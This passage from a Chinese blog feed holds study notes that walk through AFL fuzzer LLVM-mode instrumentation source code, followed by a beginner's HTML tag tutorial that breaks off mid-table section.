并直接返回（之所以向该路径下寻找，是因为<strong>默认的AFL的MakeFile在编译时，会定义一个名为<code>AFL_PATH</code>的宏，该宏会指向该路径</strong>）；</li></ul><p><strong>总而言之，该函数是为了寻找<code>afl-llvm-rt.o</code>文件，该文件即为要用到的运行时库。</strong></p><p><strong>edit_params函数</strong><br>即编辑对应参数</p><p><strong>2.afl-llvm-pass.so.cc</strong></p><figure class="highlight plaintext"><figcaption><span>文件实现了 LLVM-mode 下的一个插桩 LLVM Pass。</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs afl-llvm-pass.so.cc```">该文件只有一个Transform pass：```AFLCoverage```，继承自 ```ModulePass```，实现了一个``` runOnModule``` 函数，这也是我们需要重点分析的函数。<br>```c<br>namespace &#123;<br><br>  class AFLCoverage : public ModulePass &#123;<br><br>    public:<br><br>      static char ID;<br>      AFLCoverage() : ModulePass(ID) &#123; &#125;<br><br>      bool runOnModule(Module &amp;M) override;<br><br>      // StringRef getPassName() const override &#123;<br>      //  return &quot;American Fuzzy Lop Instrumentation&quot;;<br>      // &#125;<br><br>  &#125;;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong>runOnModule函数</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">LLVMContext &amp;C = M.getContext();<br></code></pre></td></tr></table></figure><p>获取上下文；</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Decide instrumentation ratio */</span><br><span class="hljs-type">char</span>* inst_ratio_str = getenv(<span class="hljs-string">&quot;AFL_INST_RATIO&quot;</span>);<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> inst_ratio = <span class="hljs-number">100</span>;<br></code></pre></td></tr></table></figure><p>设置插桩密度，默认为100</p><p>获取指向共享内存shm的指针和上一个基本块的id</p><p>开始插桩：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> inst_blocks = <span class="hljs-number">0</span>;<br><br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> &amp;F : M)<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> &amp;BB : F) &#123;<span class="hljs-comment">// 遍历每一个BB（基本块）</span><br><br>      BasicBlock::iterator IP = BB.getFirstInsertionPt();<span class="hljs-comment">//寻找BB中合适位置</span><br>      IRBuilder&lt;&gt; IRB(&amp;(*IP));<span class="hljs-comment">//初始化IRBuider实例执行插入</span><br><br>      <span class="hljs-keyword">if</span> (AFL_R(<span class="hljs-number">100</span>) &gt;= inst_ratio) <span class="hljs-keyword">continue</span>;<span class="hljs-comment">//如果大于插桩密度</span><br><br>      <span class="hljs-comment">/* Make up cur_loc */</span><br><br>      <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cur_loc = AFL_R(MAP_SIZE);<span class="hljs-comment">//随机创建当前基本块ID</span><br><br>      ConstantInt *CurLoc = ConstantInt::get(Int32Ty, cur_loc);<br><br>      <span class="hljs-comment">/* Load prev_loc */</span><br><br>      LoadInst *PrevLoc = IRB.CreateLoad(AFLPrevLoc);<br>      PrevLoc-&gt;setMetadata(M.getMDKindID(<span class="hljs-string">&quot;nosanitize&quot;</span>), MDNode::get(C, None));<br>      Value *PrevLocCasted = IRB.CreateZExt(PrevLoc, IRB.getInt32Ty());<br>      <span class="hljs-comment">//获取上一个BB的ID</span><br><br>      <span class="hljs-comment">/* Load SHM pointer */</span><br><br>      LoadInst *MapPtr = IRB.CreateLoad(AFLMapPtr);<span class="hljs-comment">//获取SHM地址</span><br>      MapPtr-&gt;setMetadata(M.getMDKindID(<span class="hljs-string">&quot;nosanitize&quot;</span>), MDNode::get(C, None));<br>      Value *MapPtrIdx =<br>          IRB.CreateGEP(MapPtr, IRB.CreateXor(PrevLocCasted, CurLoc));<br><br>      <span class="hljs-comment">/* Update bitmap */</span><br>      <span class="hljs-comment">//更新共享内存</span><br>      LoadInst *Counter = IRB.CreateLoad(MapPtrIdx);<br>      Counter-&gt;setMetadata(M.getMDKindID(<span class="hljs-string">&quot;nosanitize&quot;</span>), MDNode::get(C, None));<br>      Value *Incr = IRB.CreateAdd(Counter, ConstantInt::get(Int8Ty, <span class="hljs-number">1</span>));<br>      IRB.CreateStore(Incr, MapPtrIdx)<br>          -&gt;setMetadata(M.getMDKindID(<span class="hljs-string">&quot;nosanitize&quot;</span>), MDNode::get(C, None));<br><br>      <span class="hljs-comment">/* Set prev_loc to cur_loc &gt;&gt; 1 */</span><br><br>      StoreInst *Store =<br>          IRB.CreateStore(ConstantInt::get(Int32Ty, cur_loc &gt;&gt; <span class="hljs-number">1</span>), AFLPrevLoc);<br>      Store-&gt;setMetadata(M.getMDKindID(<span class="hljs-string">&quot;nosanitize&quot;</span>), MDNode::get(C, None));<br><br>      inst_blocks++;<br><br>    &#125;<br></code></pre></td></tr></table></figure><p><strong>3. afl-llvm-rt.o.c</strong><br>该文件主要实现了llvm_mode的3个特殊功能：<code>deferred instrumentation, persistent mode,trace-pc-guard mode</code></p><p><strong>deferred instrumentation</strong>:<br>AFL会尝试通过只执行一次目标二进制文件来提升性能，在<code> main()</code> 之前暂停程序，然后克隆“主”进程获得一个稳定的可进行持续fuzz的目标。简言之，避免目标二进制文件的多次、重复的完整运行，而是采取了一种类似快照的机制。</p><p>虽然这种机制可以减少程序运行在操作系统、链接器和libc级别的消耗，但是在面对大型配置文件的解析时，优势并不明显。</p><p>在这种情况下，可以将 <code>forkserver</code> 的<strong>初始化放在大部分初始化工作完成之后、二进制文件解析之前</strong>来进行，这在某些情况下可以提升10倍以上的性能。我们把这种方式称为LLVM模式下的 <code>deferred instrumentation</code>。</p><p>首先，在代码中寻找可以进行延迟克隆的合适的、不会破坏原二进制文件的位置，然后添加如下代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __AFL_HAVE_MANUAL_CONTROL    __AFL_INIT();#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p><strong>persistent mode</strong></p><figure class="highlight plaintext"><figcaption><span>mode``` 并没有通过```fork```子进程的方式来执行fuzz。一些库中提供的API是无状态的，或者可以在处理不同输入文件之间进行重置，恢复到之前的状态。执行此类重置时，可以使用一个长期存活的进程来测试多个用例，以这种方式来减少重复的 ```fork()``` 调用和操作系统的开销。不得不说，这种思路真的很优秀。</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs persistent"><br>设计框架如下：<br>设置一个 while 循环，并指定循环次数。在每次循环内，首先读取数据，然后调用想fuzz的库代码，然后重置状态，继续循环。（本质上也是一种快照。）<br><br>对于循环次数的设置，循环次数控制了AFL从头重新启动过程之前的最大迭代次数，较小的循环次数可以降低内存泄漏类故障的影响，官方建议的数值为1000。（循环次数设置过高可能出现较多意料之外的问题，并不建议设置过高。）<br>```c<br>while (__AFL_LOOP(1000)) &#123;  /* Read input data. */  /* Call library code to be fuzzed. */  /* Reset state. */&#125;/* Exit normally */<br></code></pre></td></tr></table></figure><p><strong>trace-pc-guard mode</strong><br>该功能的使用需要设置宏 <code>AFL_TRACE_PC=1 </code>，然后再执行 <code>afl-clang-fast </code>时传入参数<code>-fsanitize-coverage=trace-pc-guard</code>。</p><p>该功能的主要特点是会在每个edge插入桩代码，函数<code>__sanitizer_cov_trace_pc_guard</code>会在每个edge进行调用，该函数利用函数参数 <code>guard </code>指针所指向的 <code>uint32</code> 值来确定共享内存上所对应的地址</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>front</title>
    <link href="/2022/06/30/front/"/>
    <url>/2022/06/30/front/</url>
    
    <content type="html"><![CDATA[<h1 id="前端学习"><a href="#前端学习" class="headerlink" title="前端学习"></a>前端学习</h1><p>跟着黑马程序员学</p><h2 id="0x01-网页与html"><a href="#0x01-网页与html" class="headerlink" title="0x01 网页与html"></a>0x01 网页与html</h2><div class="code-wrapper"><pre><code class="hljs">html是一种**超文本标记语言**网页是一个html文件，由前端人员书写，浏览器渲染而展现</code></pre></div><h3 id="web标准的组成"><a href="#web标准的组成" class="headerlink" title="web标准的组成"></a>web标准的组成</h3><div class="code-wrapper"><pre><code class="hljs">web主要由结构，表现，行为组成结构：html表现：css（设计外观样式）行为：JavaScript（用于交互）</code></pre></div><h3 id="html标签"><a href="#html标签" class="headerlink" title="html标签"></a>html标签</h3><h3 id="html语法规范"><a href="#html语法规范" class="headerlink" title="html语法规范"></a>html语法规范</h3><div class="code-wrapper"><pre><code class="hljs">html标签是用尖括号括起来的关键词有开始标签也有结束标签，结束标签加反斜杠&quot;/&quot;</code></pre></div><p>标签关系<br>包含关系</p><figure class="highlight plaintext"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><pre><code class="hljs (html)">&lt;head&gt;<br>      &lt;title&gt; &lt;/title&gt;<br>&lt;/head&gt;<br></code></pre></td></tr></table></figure><p>并列关系</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;head&gt;</span> <span class="hljs-section">&lt;/head&gt;</span><br><span class="hljs-section">&lt;body&gt;</span> <span class="hljs-section">&lt;/body&gt;</span><br></code></pre></td></tr></table></figure><h3 id="第一个页面"><a href="#第一个页面" class="headerlink" title="第一个页面"></a>第一个页面</h3><p>代码如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>第一个页面<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    键盘敲烂，工资过万<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>效果如下<br><img src="/2022/06/30/front/p1.png"><br>可见，head标签负责页面上方的部分，如页面的名字<br><img src="/2022/06/30/front/p2.png"><br>而body则是网站主体内容</p><h3 id="Vscode-利用写代码"><a href="#Vscode-利用写代码" class="headerlink" title="Vscode 利用写代码"></a>Vscode 利用写代码</h3><h3 id="DOCTYPE-以及-lang等字符集作用"><a href="#DOCTYPE-以及-lang等字符集作用" class="headerlink" title="!DOCTYPE 以及 lang等字符集作用"></a>!DOCTYPE 以及 lang等字符集作用</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>意思为，使用的是html语言<br><strong>必须写在文件第一行</strong></p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&lt;html lang <span class="hljs-operator">=</span> <span class="hljs-string">&quot;en&quot;</span>&gt;<br></code></pre></td></tr></table></figure><p>lang语言种类。<br>1.en定义语言为英语<br>2.zh-CN为中文<br>定义是告诉浏览器，语言种类，定义为en也是可以显示中文的。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;meta <span class="hljs-attribute">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;<br></code></pre></td></tr></table></figure><p>UTF-8是万国码，几乎包含全世界所有国家用到的字符。</p><h3 id="html常用标签"><a href="#html常用标签" class="headerlink" title="html常用标签"></a>html常用标签</h3><p>根据标签语义，在合适的地方给一个最合理的标签，可以让页面结构更清晰。</p><h4 id="标题标签"><a href="#标题标签" class="headerlink" title="标题标签"></a>标题标签</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span> - <span class="hljs-tag">&lt;<span class="hljs-name">h6</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span> 我是一级标题<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>标签语义：</strong><br>重要的，单列一行的加粗的文字<br>且h1最重要，大于h2，以此类推。一共有六级标题。</p><h4 id="段落和换行标签（重要）"><a href="#段落和换行标签（重要）" class="headerlink" title="段落和换行标签（重要）"></a>段落和换行标签<strong>（重要）</strong></h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;p&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>我是段落标签<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>全部素材、源码、ppt、素材、讲义都在置顶留言,去下载吧~~<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>也可以直接： https://gitee.com/xiaoqiang001/html_css_material.git 下载哈！<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>1. web端布局：先讲解HTML5常用标签，接着讲解CSS3常见样式增加的H5C3新特性，新语法，最后讲解<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></td></tr></table></figure><p>如此，就能分段。<br><strong>换行标签</strong><br><strong>换行是单标签</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;br /&gt;</span><br></code></pre></td></tr></table></figure><p>br加空格，反斜杠。<br>强制文字换行。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span>和<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>的不同之处在于，段落间有空行，而换行是紧接着下一行开头开始的。<br></code></pre></td></tr></table></figure><h4 id="文本格式化标签"><a href="#文本格式化标签" class="headerlink" title="文本格式化标签"></a>文本格式化标签</h4><p>如<strong>粗体</strong>、<em>斜体</em>、下划线等等</p><p>加粗：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">strong</span>&gt;</span>我是加粗的文字<span class="hljs-tag">&lt;/<span class="hljs-name">strong</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>我是加粗的文字<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span><br></code></pre></td></tr></table></figure><p>斜体：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>我是倾斜的文字<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">i</span>&gt;</span>倾斜<span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span><br></code></pre></td></tr></table></figure><p>删除线：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs (html)">&lt;del&gt;我是删除线&lt;/del&gt;<br>&lt;s&gt;&lt;/s&gt;<br></code></pre></td></tr></table></figure><p>下划线：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">ins</span>&gt;</span>我是下划线<span class="hljs-tag">&lt;/<span class="hljs-name">ins</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">u</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">u</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="div和span标签"><a href="#div和span标签" class="headerlink" title="div和span标签"></a>div和span标签</h4><p>这两个标签是无语义的，是放内容的盒子<br>div是division的缩写，表示分割，分区。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css">&lt;<span class="hljs-selector-tag">div</span>&gt;我是一个<span class="hljs-selector-tag">div</span>标签，我单独占一行&lt;/<span class="hljs-selector-tag">div</span>&gt;<br>&lt;<span class="hljs-selector-tag">div</span>&gt;我是一个<span class="hljs-selector-tag">div</span>标签，我单独占一行&lt;/<span class="hljs-selector-tag">div</span>&gt;<br>&lt;<span class="hljs-selector-tag">span</span>&gt;百度&lt;/<span class="hljs-selector-tag">span</span>&gt;<br>&lt;<span class="hljs-selector-tag">span</span>&gt;搜狐&lt;/<span class="hljs-selector-tag">span</span>&gt;<br>&lt;<span class="hljs-selector-tag">span</span>&gt;新浪&lt;/<span class="hljs-selector-tag">span</span>&gt;<br></code></pre></td></tr></table></figure><p>结果为</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript">我是一个<span class="hljs-keyword">div</span>标签，我单独占一行<br>我是一个<span class="hljs-keyword">div</span>标签，我单独占一行<br>百度 搜狐 新浪<br></code></pre></td></tr></table></figure><p>此两个标签一横一竖，用于布局</p><h4 id="图像标签和路径（重点）"><a href="#图像标签和路径（重点）" class="headerlink" title="图像标签和路径（重点）"></a>图像标签和路径（重点）</h4><p>1.图像标签</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;图像URL&quot;</span>/&gt;<br></code></pre></td></tr></table></figure><p>src 是img标签的必须属性，它用于指定图像文件的路径和文件名。<br>img是单标签。</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs maxima">可选参数<br>alt: 当图片显示不出来时，替换用<br><span class="hljs-built_in">title</span>：鼠标浮在图片上时，显示文字<br><span class="hljs-built_in">width</span>：修改图像的宽度<br><span class="hljs-built_in">height</span>：修改图像的高度<br><span class="hljs-built_in">border</span>：设置图像的边框粗细<br></code></pre></td></tr></table></figure><h4 id="路径"><a href="#路径" class="headerlink" title="路径"></a>路径</h4><p>1.相对路径</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs stylus">相对路径：<br>以**引用文件所在位置**为参考基础，而建立出的目录路径。<br>简单来说，图片相对于HTML页面的位置。<br>同一级引用：此html文件与引用图片位于同一层<br>&lt;<span class="hljs-selector-tag">img</span> <span class="hljs-attribute">src</span> = <span class="hljs-string">&quot;img.jpg&quot;</span> /&gt;<br>下一级引用：<br>&lt;<span class="hljs-selector-tag">img</span> <span class="hljs-attribute">src</span> = <span class="hljs-string">&quot;images/img.jpg&quot;</span> /&gt;<br>上一级引用:<br>&lt;<span class="hljs-selector-tag">img</span> <span class="hljs-attribute">src</span> = <span class="hljs-string">&quot;../img.jpg&quot;</span> /&gt;<br></code></pre></td></tr></table></figure><p>2.绝对路径</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">&lt;<span class="hljs-selector-tag">img</span> <span class="hljs-attribute">src</span> = <span class="hljs-string">&quot;img的url&quot;</span>/&gt;<br></code></pre></td></tr></table></figure><h4 id="超链接标签"><a href="#超链接标签" class="headerlink" title="超链接标签"></a>超链接标签</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs xml">语法:<br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span> = <span class="hljs-string">&quot;跳转目标&quot;</span> <span class="hljs-attr">target</span> = <span class="hljs-string">&quot;窗口弹出方式&quot;</span>&gt;</span>文本或图片<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>外部链接跳转目标格式：<br>http://www.kawatsuki.com<br>需要写http与www.<br>内部链接：<br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span> = <span class="hljs-string">&quot;gons.html&quot;</span>&gt;</span>gons<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>即可<br>空链接：<br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span> = <span class="hljs-string">&quot;#&quot;</span>&gt;</span>空连接<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>显示为链接，但是不指向任何地方<br>下载链接：<br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span> = <span class="hljs-string">&quot;tar.zip&quot;</span>&gt;</span>下载文件<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>点击链接就会下载<br>锚点链接：快速跳转到本页面某处<br>语法：<br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span> = <span class="hljs-string">&quot;#f&quot;</span>&gt;</span>个人简介<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>去往某处标题：<br><span class="hljs-tag">&lt;<span class="hljs-name">h4</span> <span class="hljs-attr">id</span> = <span class="hljs-string">&quot;f&quot;</span>&gt;</span>个人简介<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml">语法<br><span class="hljs-comment">&lt;!-- ..... --&gt;</span><br>如<br><span class="hljs-comment">&lt;!--这是注释--&gt;</span><br>或快捷键：<br>ctrl + /<br>可快速注释<br></code></pre></td></tr></table></figure><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs 1c">特殊字符<br>空格：<br><span class="hljs-meta">&amp;nbsp;</span><br>是一个空格<br><span class="hljs-meta">&amp;lt;</span><br><span class="hljs-meta">&amp;gt;</span><br>分别是小于号（less than）和大于号。<br>以<span class="hljs-meta">&amp;开头以;结尾</span><br></code></pre></td></tr></table></figure><h3 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h3><h4 id="表格的基本语法"><a href="#表格的基本语法" class="headerlink" title="表格的基本语法"></a>表格的基本语法</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs css">&lt;<span class="hljs-selector-tag">table</span>&gt;<br>    &lt;<span class="hljs-selector-tag">tr</span>&gt;<br>        &lt;<span class="hljs-selector-tag">td</span>&gt;单元格中的文字&lt;/<span class="hljs-selector-tag">td</span>&gt;<br>        ...<br>    &lt;/<span class="hljs-selector-tag">tr</span>&gt;<br>    ...<br>&lt;/<span class="hljs-selector-tag">table</span>&gt;<br><br><span class="hljs-selector-tag">table</span>是用于定义表格的标签<br><span class="hljs-selector-tag">tr</span>是表格中的行<br><span class="hljs-selector-tag">td</span>是<span class="hljs-selector-tag">table</span> data，定义表格中的单元格，必须嵌套在<span class="hljs-selector-tag">tr</span>内<br></code></pre></td></tr></table></figure><h4 id="表头单元格标签"><a href="#表头单元格标签" class="headerlink" title="表头单元格标签"></a>表头单元格标签</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml">用<span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>words<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>代替<span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs css">&lt;<span class="hljs-selector-tag">thead</span>&gt;<br>&lt;/<span class="hljs-selector-tag">thead</span>&gt;<br>可以用此包括第一个&lt;<span class="hljs-selector-tag">tr</span>&gt;&lt;/<span class="hljs-selector-tag">tr</span>&gt;<br>表示表头区域<br>&lt;<span class="hljs-selector-tag">tbody</span>&gt;<br>&lt;<span class="hljs-selector-tag">tr</span>&gt;<br>...<br>&lt;/<span class="hljs-selector-tag">tr</span>&gt;<br>&lt;<span class="hljs-selector-tag">tr</span>&gt;<br>...<br>&lt;/<span class="hljs-selector-tag">tr</span>&gt;<br>&lt;/<span class="hljs-selector-tag">tbody</span>&gt;<br><span class="hljs-selector-tag">thead</span>与<span class="hljs-selector-tag">tbody</span>内必须有&lt;<span class="hljs-selector-tag">tr</span>&gt;<br>此两个标签用于分割表头与表体，包含于&lt;<span 